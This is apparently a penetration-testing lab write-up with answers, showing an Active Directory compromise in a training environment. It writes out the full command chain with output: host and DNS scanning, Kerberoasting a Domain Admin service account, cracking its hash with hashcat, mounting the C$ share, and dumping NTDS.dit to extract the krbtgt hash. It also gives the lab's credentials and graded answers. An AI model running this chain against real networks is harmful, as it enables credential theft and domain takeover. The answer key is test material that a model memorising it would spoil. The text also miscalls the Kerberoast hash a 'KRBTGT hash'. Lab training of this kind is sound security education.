# Documentation & Reporting Practice Lab
You are an assessor for Acme Security, Ltd. Your team has been hired to perform an internal penetration test against one of Inlanefreight's internal networks. The tester assigned to the project had to go out on leave unexpectedly, so you have been tasked by your manager with taking over the assessment. You've had limited communication with the tester, and all of their notes are left on the testing VM configured within the internal network. The scope provided by the client is as follows:

- Network range: 172.16.5.0/24
- Domain: INLANEFREIGHT.LOCAL

Your teammate has already created a directory structure and detailed Obsidian notebook to record their testing activities. 

## Questions
RDP to 10.129.140.144 (ACADEMY-DOCRPT-PAR01), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host. **Answer: d0c_pwN_r3p0rt_reP3at!**
   - Remote to the target, identify the network and `DC01` IP address by first scanning the `ens224` interface IP range, then do a quick ping scan to identify alive hosts. With a list of alive hosts, scan for the DNS server, use that DNS server to resolve `DC01.inlanfreight.local` IP address → `172.16.5.5`:
        ```shellsession
        $route -n
        Kernel IP routing table
        Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
        0.0.0.0         10.129.0.1      0.0.0.0         UG    100    0        0 ens192
        0.0.0.0         172.16.5.1      0.0.0.0         UG    101    0        0 ens224
        10.129.0.0      0.0.0.0         255.255.0.0     U     100    0        0 ens192
        172.16.4.0      0.0.0.0         255.255.254.0   U     101    0        0 ens224
        172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
        172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-9ed4b4f7da40
        $fping -asgq 172.16.4.0/23 > alive_hosts.txt

            510 targets
            5 alive
            505 unreachable
            0 unknown addresses

            2020 timeouts (waiting for response)
            2025 ICMP Echos sent
            5 ICMP Echo Replies received
            2020 other ICMP received

        0.038 ms (min round trip time)
        0.845 ms (avg round trip time)
        1.36 ms (max round trip time)
            15.219 sec (elapsed real time)
        $sudo nmap -sS -sU -p 53 -iL alive_hosts.txt 
        Starting Nmap 7.92 ( https://nmap.org ) at 2026-08-01 09:55 EDT
        Nmap scan report for inlanefreight.local (172.16.5.5)
        Host is up (0.00088s latency).

        PORT   STATE SERVICE
        53/tcp open  domain
        53/udp open  domain
        MAC Address: A2:DE:AD:99:AE:F4 (Unknown)
        <SNIP>
        $nslookup DC01.inlanefreight.local 172.16.5.5
        Server:		172.16.5.5
        Address:	172.16.5.5#53

        Name:	DC01.inlanefreight.local
        Address: 172.16.5.5`
        ```
   - Go through the notes, found a list of SPN accounts already found noted in `H1 - Kerberoasting`, including the `solarwindsmonitor` SPN account. We also already have a user credential for DC01: `asmith`:`Welcome1`. Let's get the SPN KRBTGT hash and try to crack it → got valid admin credential `solarwindsmonitor`:`Solar1010`:
        ```shellsession
        $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith -request-user solarwindsmonitor
        Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

        Password: Welcome1 
        ServicePrincipalName     Name               MemberOf                                             PasswordLastSet             LastLogon  Delegation 
        -----------------------  -----------------  ---------------------------------------------------  --------------------------  ---------  ----------
        sts/inlanefreight.local  solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:11:38.041017  <never>               



        $krb5tgs$23$*solarwindsmonitor$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/solarwindsmonitor*$4858d7f86ba7a24ddaf55a59470dd31c$080e6201cb01fc03ffe611d4f4b9d3db581a9af0264ae8b7eed775ee57a9ae86a82c9b885b9f3a9cf43ac2e326fdaeb16607abf053cc7336741ab30fd2060a12824c0843056ed90bb61902bb7faca69a472f4be34125fc2fbbcfcb2214bd5308036d457d7488e19b7c4b67dcd256e32d5d01dafa725ffc4aa135c97f3e680f04a0cabbdddc3b1d9ce047d179fbde39602267f4a9c70bb5c870f0f3be53db6c185c5a77ed5643678cd65f8099a6eb7b23e4fe713ba8335e2fa638f7b719646ac8d8917bd24d042920ac1ff5c564623ea3ed5d432cc15a117110f4aead7168acf6401b311eedeb07476115dc9460afb4e159227fea9b1848e3d4cb92f2ffffe71e35d231cf4cda5e47de78cdb9de93572e4653d56dc985327cf2eea4cb61c8701cdf7633305cbe2f17b3aa1e4f189a3ab01050f7eb99625d1a3f7065cb3722d3cc46bc2c76ed4232f3f4b81ed43c85148b4759d4a40145a43312a778c72f5811b98b2ef612d51b08bcd0190e036d6e3200db789d48761a3cf45182cd86baabe689689aa56d595924f237021bafb9c4b22755b7bff1be01b841ca263ada98c4a6ae6f037346b13d52d5b187e0a139f081aa5087d6da45af416d23965a8823fe5b9cdd1137fdfcb2f42e2c7fc6dead328f8f06b1a021fda01a5b115a1d201ecc4fbd5ab5ab6ad27b6930ebee8389c9b0e97a928001c13abd9589c6efa942e8ffda51bf466428e9a7e264d3e0de5d7ef107e8436c126accb2c2d9821f3e0b487212f6eaf0afe80b2b33a0648fb7857df9f71d6cfa8ea4ef3bf3352fad330639171d55c52d368726ae9a71722dca8bfddac6c5f611e50667b403a11730087a20999d71255f0b695ee8caed1df45eb5163b847fc34ecbac5f7970f290686be3bb25ca5f9cfd5f36b90c67d1a2ee86e52cb3ff6b9a44177ea9fe01f9a58c2d0b119882f17c3fa5230946c7312406f0a513b338f8a6462b5195f55d41d22c67e45f0d7fedf86e0f45f8f9bb4c4d1f752fef31f2c8f46b9c8eecdd1a84698dfb66137137b824d65f792bf3b52f432eb5cb07788574d4d9b35c5453935f06f34b271e2ca8ae3f00e2d6de0c06df3c31ac69efa287ced0014d8e041af1b28fd9f44e11e0a1d24220f93aecb82593037ceb4b8efdbc35bc16615f20462e61b4524ce441b72f8aba9f81770c72fda286c53c5d998df1ecf2d3a3db37a52f36e46cf1b1f7734a328725bb3facb85982d8fb1ff3e746a7276a2b2740dadf17951f2e2a7cb1a0b33a7b470cea40d2bd43862cf6820833b13c13db6ee1f9afe27f5ce04ebde099e93e720b8048fd22e1f822729f694d8d1af499fd
        ```
        At local attacker machine, crack this Kerberos token offline:
        ```shellsession
        $ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt 
        hashcat (v6.2.6) starting

        <SNIP>

        $krb5tgs$23$*solarwindsmonitor$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/solarwindsmonitor*$4858d7f86ba7a24ddaf55a59470dd31c$080e6201cb01fc03ffe611d4f4b9d3db581a9af0264ae8b7eed775ee57a9ae86a82c9b885b9f3a9cf43ac2e326fdaeb16607abf053cc7336741ab30fd2060a12824c0843056ed90bb61902bb7faca69a472f4be34125fc2fbbcfcb2214bd5308036d457d7488e19b7c4b67dcd256e32d5d01dafa725ffc4aa135c97f3e680f04a0cabbdddc3b1d9ce047d179fbde39602267f4a9c70bb5c870f0f3be53db6c185c5a77ed5643678cd65f8099a6eb7b23e4fe713ba8335e2fa638f7b719646ac8d8917bd24d042920ac1ff5c564623ea3ed5d432cc15a117110f4aead7168acf6401b311eedeb07476115dc9460afb4e159227fea9b1848e3d4cb92f2ffffe71e35d231cf4cda5e47de78cdb9de93572e4653d56dc985327cf2eea4cb61c8701cdf7633305cbe2f17b3aa1e4f189a3ab01050f7eb99625d1a3f7065cb3722d3cc46bc2c76ed4232f3f4b81ed43c85148b4759d4a40145a43312a778c72f5811b98b2ef612d51b08bcd0190e036d6e3200db789d48761a3cf45182cd86baabe689689aa56d595924f237021bafb9c4b22755b7bff1be01b841ca263ada98c4a6ae6f037346b13d52d5b187e0a139f081aa5087d6da45af416d23965a8823fe5b9cdd1137fdfcb2f42e2c7fc6dead328f8f06b1a021fda01a5b115a1d201ecc4fbd5ab5ab6ad27b6930ebee8389c9b0e97a928001c13abd9589c6efa942e8ffda51bf466428e9a7e264d3e0de5d7ef107e8436c126accb2c2d9821f3e0b487212f6eaf0afe80b2b33a0648fb7857df9f71d6cfa8ea4ef3bf3352fad330639171d55c52d368726ae9a71722dca8bfddac6c5f611e50667b403a11730087a20999d71255f0b695ee8caed1df45eb5163b847fc34ecbac5f7970f290686be3bb25ca5f9cfd5f36b90c67d1a2ee86e52cb3ff6b9a44177ea9fe01f9a58c2d0b119882f17c3fa5230946c7312406f0a513b338f8a6462b5195f55d41d22c67e45f0d7fedf86e0f45f8f9bb4c4d1f752fef31f2c8f46b9c8eecdd1a84698dfb66137137b824d65f792bf3b52f432eb5cb07788574d4d9b35c5453935f06f34b271e2ca8ae3f00e2d6de0c06df3c31ac69efa287ced0014d8e041af1b28fd9f44e11e0a1d24220f93aecb82593037ceb4b8efdbc35bc16615f20462e61b4524ce441b72f8aba9f81770c72fda286c53c5d998df1ecf2d3a3db37a52f36e46cf1b1f7734a328725bb3facb85982d8fb1ff3e746a7276a2b2740dadf17951f2e2a7cb1a0b33a7b470cea40d2bd43862cf6820833b13c13db6ee1f9afe27f5ce04ebde099e93e720b8048fd22e1f822729f694d8d1af499fd:Solar1010

        <SNIP>
        ```
   - With that credential, enumerate readable shares and find the flag:
        ```shellsession
        $sudo crackmapexec smb 172.16.5.5 -u solarwindsmonitor -p Solar1010 --shares
        SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
        SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\solarwindsmonitor:Solar1010 (Pwn3d!)
        SMB         172.16.5.5      445    DC01             [+] Enumerated shares
        SMB         172.16.5.5      445    DC01             Share           Permissions     Remark
        SMB         172.16.5.5      445    DC01             -----           -----------     ------
        SMB         172.16.5.5      445    DC01             ADMIN$          READ,WRITE      Remote Admin
        SMB         172.16.5.5      445    DC01             C$              READ,WRITE      Default share
        SMB         172.16.5.5      445    DC01             Department Shares READ,WRITE      
        SMB         172.16.5.5      445    DC01             IPC$            READ            Remote IPC
        SMB         172.16.5.5      445    DC01             NETLOGON        READ,WRITE      Logon server share 
        SMB         172.16.5.5      445    DC01             SYSVOL          READ            Logon server share 
        SMB         172.16.5.5      445    DC01             User Shares     READ,WRITE      
        SMB         172.16.5.5      445    DC01             ZZZ_archive     READ,WRITE 
        $mkdir share
        $sudo mount -t cifs //172.16.5.5/"C$" share -o username=solarwindsmonitor,password=Solar1010
        $find share -type f -name flag.txt 2>/dev/null
        share/Users/Administrator/Desktop/flag.txt
        $ cat share/Users/Administrator/Desktop/flag.txt
        d0c_pwN_r3p0rt_reP3at!
        ```
2. After achieving Domain Admin, submit the NTLM hash of the KRBTGT account. **Answer: 16e26ba33e455a8c338142af8d89ffbc**
   - Use the `solarwindsmonitor` credentials, run crackmapexec to dump the `NTDS.dit` file and look for the `krbtgt` account:
        ```shellsession
        $crackmapexec smb 172.16.5.5 -u solarwindsmonitor -p Solar1010 --ntds | grep krbtgt
        SMB         172.16.5.5      445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
        ```
3. Dump the NTDS file and perform offline password cracking. Submit the password of the svc_reporting user as your answer. **Answer:Reporter1!**
   - Same method as above + offline cracking with `hashcat -m 1000`
4. What powerful local group does this user belong to? **Answer:**
   - Use ldapsearch to look for the `memberOf` attribute of this user:
        ```shellsession
        $ldapsearch -x -H ldap://172.16.5.5 -D "solarwindsmonitor@INLANEFREIGHT.LOCAL" -w "Solar1010" -b "DC=INLANEFREIGHT,DC=LOCAL" "(sAMAccountName=svc_reporting)" memberof
        # extended LDIF
        #
        # LDAPv3
        # base <DC=INLANEFREIGHT,DC=LOCAL> with scope subtree
        # filter: (sAMAccountName=svc_reporting)
        # requesting: memberof 
        #

        # svc_reporting, Users, INLANEFREIGHT.LOCAL
        dn: CN=svc_reporting,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        memberOf: CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
        ```